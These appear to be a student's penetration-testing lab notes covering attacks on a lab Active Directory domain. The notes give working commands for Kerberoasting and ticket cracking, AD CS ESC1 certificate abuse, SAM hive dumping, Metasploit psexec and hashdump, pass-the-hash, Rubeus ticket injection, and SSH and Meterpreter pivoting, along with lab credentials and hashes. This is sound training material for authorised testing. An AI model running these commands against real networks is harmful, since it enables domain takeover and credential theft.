## Kerberoast

1: Enumerate and Request Tickets
As a first step, we will use the GetUserSPNs.py Python script, which will perform the following steps:

Enumerate users with a Service Principal Name (SPN). As a reminder, service accounts have a SPN configured!
Request a service ticket for these service accounts
This attack requires access as any user. We'll use hiboxy\bgreen with the password Password1 that we found in 560.2.

We'll use GetUserSPNs.py from impacket. We need to provide a few options:

credentials — We can provide the domain, username, and password like this: hiboxy/bgreen:Password1
-request — Tell the tool to request the tickets after it identifies them
-dc-ip — The IP address of the DC from which we are requesting tickets
`GetUserSPNs.py hiboxy.com/bgreen:Password1 -request -dc-ip 10.130.10.4 | tee /tmp/spns.output`

2: Cracking the ticket
`grep krb5tgs /tmp/spns.output > /tmp/tickets`

then cracking:
```
sed 's/.*/\u&/' /usr/share/wordlists/rockyou.txt > ~/labs/Rockyou.txt
hashcat -m 13100 -a 6 /tmp/tickets ~/labs/Rockyou.txt ?d
```

3: Cracking the domain admin ticket

```
sed 's/.*/\u&/' /usr/share/dict/american-english-insane > /home/sec560/labs/American-English-Insane.txt
hashcat -m 13100 -a 7 /tmp/tickets ?s /home/sec560/labs/American-English-Insane.txt
```

4: Use stolen credential
As a last step, we will now use our freshly stolen credential to access the domain controller (DC01 - 10.130.10.4).

We will use wmiexec.py to execute commands on DC01 using our newly compromised SVC_SQLService2 account.

`wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.4 whoami`

## Bloodhound

1: Gather BloodHound Data using bloodhound-python
The general workflow of BloodHound analysis is as follows:

1. Inside the target environment, with network connectivity to the domain controller and other domain-joined systems, gather BloodHound data using an ingestor, such as the official SharpHound.exe, bloodhound-python, or rusthound.
2. Exfiltrate the extracted information (either JSON files or zip files, depending on the ingestor and options) to an external system with the BloodHound user interface installed.
3. Load the extracted information into the BloodHound user interface (either by drag-and-dropping the files, or by using the Upload button).
4. Analyze the gathered BloodHound data using the BloodHound to find useful "paths" from compromised users to high-value targets, such as Domain Admins.
5. Back in the target environment, use the information gathered from BloodHound to exploit the chains of misconfigurations and features allowing useful access (such as a path from an initially-compromised user to the Domain Admins group).

```
sudo systemctl start neo4j
bloodhound-python -d hiboxy.com -u bgreen -p Password1 -c All -ns 10.130.10.4
```

2: Gather BloodHound Data using RustHound
`rusthound -d hiboxy.com -u bgreen@hiboxy.com -p Password1 -f DC01.hiboxy.com -z`

3: Launch BloodHound
`/opt/BloodHound/BloodHound --no-sandbox`

4: Login to BloodHound
login with neo4j:sec560

5: Upload BloodHound Data
6: Pathfinding in BloodHound
Click the pathfinding icon in the upper-left portion of the BloodHound UI:

7: Built-In Queries: Find all Domain Admins
Next, let's look at some of the built-in queries inside BloodHound. Click the hamburger icon (three horizontal lines) in the upper-left corner of the BloodHound UI:

8: Built-In Queries: Paths from Kerberoastable Users to Domain Admins
use the queries within to review shortest paths to Domain Admins to assist in exploitation paths

## Attacking Active Directory Certificate Services (AD CS) with ESC1

We need to configure our Windows system to use the DNS server for lookups ONLY for hiboxy.com. To do this, we need to launch an elevated PowerShell terminal. Open the link in the desktop titled Terminal.

Now, let's configure DNS to query 10.130.10.4 for ONLY hiboxy.com. Note, this command does not have any output.

`Add-DnsClientNrptRule -Namespace "hiboxy.com" -NameServers 10.130.10.4`

As a reference we can use the commands below on Linux, but we already preconfigured the system by adding a network (/etc/systemd/network/sec560-lab.network).

```
sudo resolvectl dns tun0 10.130.10.4
sudo resolvectl domain tun0 hiboxy.com
```

run a powershell as bgreen:
`runas /user:hiboxy.com\bgreen /netonly powershell.exe`

2: Initial Query
`Certify.exe cas /domain:hiboxy.com`

We see the name of the CA certificate is hiboxy-CA01-CA. The serial number, thumbprint, and dates will differ from what is shown above as the servers and certificates are rebuilt weekly.

Note that the Cert Chain only includes the hiboxy-CA01-CA certificate. Root certificates are self-signed and must be explicitly trusted to trust any subordinate certificates. Operating systems and browsers come with pre-approved lists of Trusted Root Certification Authorities, such as DigiCert. For a domain CA, this trust is commonly setup in Group Policy to configure all domain hosts to trust the domain CA.

Let's look at the Enterprise/Enrollment CAs list.

Notice the line mentioning Allow Enroll.

3: Identifying Vulnerable Templates
`Certify.exe find /vulnerable /domain:hiboxy.com`

The tool identified that the UserAuthenticationCertificate template includes ENROLLEE_SUPPLIES_SUBJECT in the msPKI-Certificate-Name-Flag attribute. This is the enrollee-supplied subject (subjectAltName, or SAN for short) component of ESC1. This setting enables certificate requesters to request certificates for any users in the domain, including domain admin users. Without mitigating controls, this setting enables complete domain takeover. In domains where mitigations prevent Certificate Signing Request (CSR) with SANs set for domain admins, this configuration can still be abused to impersonate other domain users. 

4: Running Find with Certipy
Switch to your Linux VM for this and later steps.

Open a terminal in your Linux VM and run the Certipy command as shown below to get a list of vulnerable CAs and templates:

`certipy find -u bgreen@hiboxy.com -password Password1 -dc-ip 10.130.10.4`

The tool creates a .txt and a .json file containing the output. If you like, you can look at the .json file, but it's very long, and not shown here.

Let's look at the template we already know is vulnerable, UserAuthenticationCertificate. We will use grep to search for the string UserAuthenticationCertificate and then show the 19 lines afterwards using the -A 19 option (-A means to show some number of lines after a match, whereas the corresponding -B means to show some number of lines before a match).

`cat *_Certipy.txt | grep -A 19 UserAuthenticationCertificate`

Let's look at the interesting lines from the output above.

```
Client Authentication               : True
The above line allows users to authenticate using certificates from this template.


Enrollee Supplies Subject           : True
The above line allows the enrollee (us, the attacker) to specify the subject name.


Requires Manager Approval           : False
The above line tells us that no additional approval is required to use this template.


Authorized Signatures Required      : 0
The above line tells us that no additional signatures are required to use this template.
```

We see that HIBOXY.COM\Domain Users has Enrollment Permissions and that the tool has detected a vulnerable template.

5: Requesting a Certificate with Certipy
```
grep "CA Name" *_Certipy.txt

#We need one more thing when running against modern AD:CS servers (running Windows Server 2022 as of February 2025 or later) -- the -sid option with the full Security ID (SID) of the user we are going to impersonate. We can find the SID for the Administrator account using the lookupsid command as follows:


lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 500
export sid=$(lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 500 | grep 'Domain SID is:' | cut -d' ' -f5)
```
Let's now request the certificate using the following options:

req - command to request the certificate
-username bgreen@hiboxy.com - the user to authenticate as
-password Password1 - password of the user above
-ca hiboxy-CA01-CA - the name of the CA
-template UserAuthenticationCertificate The name of the vulnerable template
-upn administrator@hiboxy.com - the user we are going to impersonate
-sid "${sid}-500" - the SID of the user we are going to impersonate (in this case, Administrator, which has a well-known SID suffix of 500)
-target ca01.hiboxy.com - the FQDN of the CA server
Let's run the command:

`certipy req -username bgreen@hiboxy.com -password Password1 -ca hiboxy-CA01-CA -template UserAuthenticationCertificate -upn administrator@hiboxy.com -sid "${sid}-500" -target ca01.hiboxy.com`

6: Recovering the NT hash using the recovered certificate
`certipy auth -pfx administrator.pfx -dc-ip 10.130.10.4`

## Lateral Movement from Windows

1: WMIC to Run Commands on Remote Windows System
First, as we learned in Lab 3.1: MSF psexec, hashdumping, and Mimikatz, bgreen is an admin on 10.130.10.5, 10.130.10.25, and 10.130.10.44. So, we can connect to the hidden administrative share for the C drive, C$. Let's map a drive to 10.130.10.25's C:Windows\Temp\ directory via the administrative share and then change directories into the the newly mapped drive.

Let's gather some information about the target system. We can start with the systeminfo command, but we need to redirect the output to a file since it will not be returned to wmic. Because wmic launches the remote commands directly instead of through a command shell, we can't use a shell redirect to save the output. To work around that, we can use cmd /c to run systeminfo, and since it is now being run by cmd.exe, we can use a shell redirect to save the results.

The wmic command can get quite long and complex, so let's break it down before running it:

- wmic - The Windows Management Instrumentation Command.
- /node:10.130.10.25 - /node lets us specify a remote computer or IP. We could also use the @ to specify a file with host names or IP addresses, like /node:@hosts.txt. It would then run the WMI query we specify on each system listed in the file.
- /user:hiboxy\bgreen /password:Password1 - These parameters specify the username and password required to connect to the remote system. If the logged in user is an admin on the remote machine, it is not necessary to specify the username and password.
- process call create - This is the WMI query. In this case, it tells the remote computer to run a specified command.
- "cmd.exe /c systeminfo > C:\Windows\Temp\WINDOWS_ETHERNET2_ADDRESS\systeminfo.txt" This is the command WMI is going to run. Let's break this one down, too.
- cmd.exe /c - When run with /c, cmd.exe "Carries out the command specified by string and then terminates". In other words, cmd.exe will run this next command and quit. We need to use this so we can use a shell redirect to save systeminfo's output. You can see cmd.exe's other options by entering cmd.exe /? in a Windows terminal.
- systeminfo - This is a built in Windows command that gathers information like the OS build version, OS Configuration, Install Date, and installed Hotfixes.
`wmic /node:10.130.10.25 /user:hiboxy\bgreen /password:Password1 process call create "cmd.exe /c systeminfo > C:\Windows\Temp\WINDOWS_ETHERNET2_ADDRESS\systeminfo.txt"`

While systeminfo is nice, there are more interesting things to loot from the machine. Let's export the SAM and SYSTEM registry hives so we could use secretsdump.py to extract password hashes. This time, we'll use wmic to run the reg save command and save copies of HKEY_LOCAL_MACHINE/SAM and HKEY_LOCAL_MACHINE/SYSTEM. We can abbreviate HKEY_LOCAL_MACHINE as HKLM.

```
wmic /node:10.130.10.25 /user:hiboxy\bgreen /password:Password1 process call create "reg save HKLM\SAM C:\Windows\Temp\WINDOWS_ETHERNET2_ADDRESS\SAM.hive"
wmic /node:10.130.10.25 /user:hiboxy\bgreen /password:Password1 process call create "reg save HKLM\SYSTEM C:\Windows\Temp\WINDOWS_ETHERNET2_ADDRESS\SYSTEM.hive"
```

2: Invoke-Command and Enter-PSSession
Invoke-Command, Enter-PsSession, and winrs all use Windows Remote Management to execute commands. The WinRM clients are not enabled by default on Windows 10 and Windows 11, but the server-side components are enabled by default for all versions since Windows Server 2012.

To enable the client side WinRM components, open an administrative PowerShell window and run Enable-PSRemoting.
`Enable-PSRemoting`

Now that we have the WinRM client enabled, we need to make two configuration changes.
1. The WinRM client needs CredSSP enabled. 2. The WinRM client needs to trust any host.

By default, WinRM is configured with CredSSP disabled because the preferred authentication scheme is Microsoft Kerberos. CredSSP uses the Simple and Protected Negotiate (SPNEGO) protocol to negotiate Microsoft Kerberos or NTLM for authentication.

Because our Windows VM is not a member of the target domain, Kerberos will not work. So, WinRM needs CredSSP so it can negotiate down to NTLM authentication.

By default, WinRM only trusts a host if it is specified in the client configuration or if the remote host is a member of the same domain and can use Kerberos for authentication. The default configuration protects the client from credential harvesting attacks like Responder.

Let's change those two settings.

```
winrm set winrm/config/client/auth '@{CredSSP ="true"}'
winrm set winrm/config/client '@{TrustedHosts ="*"}'
```

Now that we have WinRM enabled, let's use Invoke-Command to run the systeminfo command interactively so we don't have to save the results to a file. We need to use the Get-Credential cmdlet to create a credential object. By default, PowerShell will open a system dialogue box to enter the credentials. We can disable that dialog box by enabling ConsolePrompting in the registry.

`Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds" -Name ConsolePrompting -Value $true`

With that change in place, use Get-Credential to create a credential object. When prompted in the console bgreen's password, enter Password1.

```
$Creds = Get-Credential hiboxy\bgreen
Invoke-Command 10.130.10.25 -Credential $Creds {systeminfo}
Enter-PSSession 10.130.10.25 -Credential $Creds
#Now we are on the .25 system
```

3: PsExec.exe
`psexec \\10.130.10.5 -u hiboxy\bgreen -p Password1 -i ipconfig`

The delay is PsExec making the initial connection over TCP 445, then trying to switch to TCP 135, and then falling back to TCP 445.

## Lateral Movement from Linux
As we learned earlier in this class, 10.130.10.21 and 10.130.11.13 system are both Windows. Let's check which of these hosts is listening (and accessible) on TCP port 445.

2: SSH for Interactive Shells and Single Commands
`ssh bgreen@10.130.10.22`

Next, let's run a few commands to determine more about this remote host:

```
lsb_release -a
id
sudo -l -l
```

Let's start off by seeing if the jump02 system can reach 10.130.11.13 on TCP port 445. Remember, we can't reach this host directly from across the VPN!

`nc -v -z 10.130.11.13 445`

Next, let's show some lesser-known capabilities of ssh itself. While it's often used to run an interactive shell, ssh can generally start any command on the destination machine. Let's start by running a single command:

`ssh bgreen@10.130.10.22 id`

Next steps is just setting up an ssh key:
```
ssh-keygen

cat /home/sec560/.ssh/id_ed25519.pub >> /home/sec560/.ssh/authorized_keys
sudo service ssh start
ssh localhost "echo hello; sleep 1; echo from; sleep 1; echo inside; sleep 1; echo SSH; exit"

apropos ssh-copy-id 
ssh-copy-id bgreen@10.130.10.22
```

3: SSH for Pivoting (Single Port Redirection)
Local pivot: `ssh -L 7777:10.130.11.13:445 bgreen@10.130.10.22`

The full syntax for a local port redirect via SSH is -L local_ip:local_port:server_ip:server_port, breaking down as follows:

local_ip: The IP address on the SSH client to listen on (defaults to 127.0.0.1 if left blank)
local_port: The TCP port on the SSH client to listen on while the SSH session is open
server_ip: The IP address that the SSH server will be tunneling connections to
server_port: The TCP port that the SSH server will be tunneling connections to
While it's common for the server_ip and server_port to be a service running on the SSH server itself, it doesn't have to be. In our case, 10.130.11.13 is a remote machine accessible through the SSH server (10.130.10.22).

interacting with the local port forward: `DumpNTLMInfo.py localhost -port 7777`

4: SSH for Pivoting (Dynamic SOCKS Proxy)
dynamic SOCKS proxy: `ssh bgreen@10.130.10.22 -D 1080`

## Impacket

1: wmiexec.py
This tool allows us to run commands on a remote service. It does require we have Admin level access on the target. The biggest drawback is that it uses DCOM and we need to be able to access DCOM ports on the target system, but they are sometimes blocked by a firewall, and you may have to use another tool, such as smbclient.py (discussed later).

`wmiexec.py [[domain/]username[:password]@]<targetName or address> command`

2: smbexec.py
This tools works similar to the wmiexec. It can operate in two modes, depending on how the tool is run. According to the documentation:

1. share mode: you specify a share, and everything is done through that share.
2. server mode: if for any reason there's no share available, this script will launch a local SMB server, so the output of the commands executed are sent back by the target machine into a locally shared folder. Keep in mind you would need root access to bind to port 445 in the local machine.

`sudo smbexec.py sec560:sec560@WINDOWS_ETHERNET0_ADDRESS`

3: smbclient.py
This is different from smbexec.py. This is a client used to navigate shares and move files to and from systems. Let's connect to the file server at 10.130.10.44. This time, we are going to use the domain user and the password we discovered earlier in the class. Since this is a domain user, we need to format the username as domain/username. We can still use the password on the command line.

Start an smbclient.py connection with the file server using bgreen
`smbclient.py hiboxy/bgreen:Password1@10.130.10.44`

commands helpful to run:
```
shares
use FileShare
ls
cd 
get
```

4: lookupsid.py
The lookupsid.py command will enumerate all the users in the domain. We need to specify a domain user since null/anonymous bind is extremely rare these days. In this case, the target is going to be the domain controller.

`lookupsid.py hiboxy/bgreen:Password1@10.130.10.4`

You'll see a lot of output here. The list includes every user (SidTypeUser) and group (SidTypeGroup) in the domain.

This is a long list, if we only want a shorter list we can specify a RID to stop before. Run the command again, but add 520 at the end.

`lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 520`

## C2 Pivoting and Pass-the-Hash

1: Obtaining Hashes
```
use exploit/windows/smb/psexec
set smbuser bgreen
set smbpass Password1
set smbdomain hiboxy
set rhosts 10.130.10.5
set lhost tun0
run

#now dump hashes
run post/windows/gather/hashdump
```

2: Using the Hashes
```
background
set smbuser antivirus
set SMBPass aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e
set RHOSTS 10.130.10.21
run
```

4: Meterpreter Pivoting
```
sysinfo
getuid
ifconfig

help load
load -l
load powershell

powershell_execute "Test-NetConnection -ComputerName 10.130.11.13 -Port 445"
```

Excellent! We've verified that our victim machine (JUMP01) can reach 10.130.11.13 on port 445. Next, let's set up Metasploit's own routing capabilities.

```
background
route add 10.130.11.0/24 -1
route print
```

Using -1 (negative one) as the session number is a shortcut telling Metasploit to use the highest-numbered active meterpreter session. Often, this would be the most recent session.

Next, we'll show that 10.130.11.13 is now reachable through any Metasploit module. We'll start with a classic: auxiliary/scanner/smb/smb_version.

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.130.11.13
run
```

While we could use the psexec module to attack 10.130.11.13 (and it's a good bonus for the lab!), let's instead show how to pivot using SSH instead of meterpreter.

5: Metasploit via SOCKS Proxying
```
ssh -D 1080 bgreen@10.130.10.22

#in new terminal
msfconsole -q
setg Proxies socks5:127.0.0.1:1080
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.130.11.1-20
set THREADS 20
run
```

Though not every Metasploit module supports the Proxies variable, nearly all do. While here we're using SSH to provide the SOCKS proxy, many C2 frameworks have built-in SOCKS proxying capabilities as well. Since we've setg Proxies, we've set the variable globally, across all modules.

As our crescendo, let's Pass-the-Hash to the antivirus account on 10.130.11.13 using the psexec module:

```
use exploit/windows/smb/psexec
set RHOSTS 10.130.11.13
set LHOST tun0
set LPORT 4401
set SMBUser antivirus
set SMBDomain hiboxy.com
set SMBPass aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e
set ReverseAllowProxy true
run
```

6: Passing the Hash with Impacket
`psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e hiboxy/antivirus@10.130.10.21 cmd.exe`

7: "Overpass-the-Hash" with Rubeus
`Rubeus.exe asktgt /user:antivirus /domain:hiboxy.com /dc:10.130.10.4 /rc4:47f0ca5913c6e70090d7b686afb9e13e /ptt`

This is a common point of confusion for penetration testers. When performing actions via Kerberos, you generally need to be accessing by name, not by IP. As penetration testers, we generally have two main approaches to solving this problem:

Add the client's domain controller as our resolver for any host under hiboxy.com (or generally, the client's Active Directory domain(s))
By editing the hosts file (C:\Windows\system32\drivers\etc\hosts) and adding any needed entries manually, bypassing DNS entirely
Luckily, we've already added the DC as our DNS resolver for entries under hiboxy.com, so we can simply show that resolution is working properly, then access the same server (JUMP01.hiboxy.com / 10.130.10.21) using its name, instead:

```
dir \\JUMP01.hiboxy.com\C$
Resolve-DnsName JUMP01.hiboxy.com
```

